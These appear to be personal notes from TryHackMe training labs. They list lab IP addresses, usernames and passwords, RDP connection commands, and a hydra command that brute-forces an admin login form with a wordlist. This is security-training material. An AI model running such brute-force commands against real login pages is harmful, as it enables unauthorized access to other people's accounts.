IP Address: **10.10.49.23**

Username: **cmnatic**

Password: **yararules!**

SSH Port: **22**

`rdesktop -u username -f IP`

xfreerdp
best rdp soffware


xfreerdp /u:Analysis /p:Tryhackme123! /v:10.10.140.138 
Username: Administrator

Password: BHN2UVw0Q
xfreerdp /u:Administrator /p:BHN2UVw0Q /v:10.10.214.145



http://10.10.180.60/Account/login.aspx?ReturnURL=%2fadmin%2f

hydra -l admin -P /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
10.10.214.145/Account/login.aspx http-post-form "/:username=^USER^&password=^PASS^:F=Login failed" -V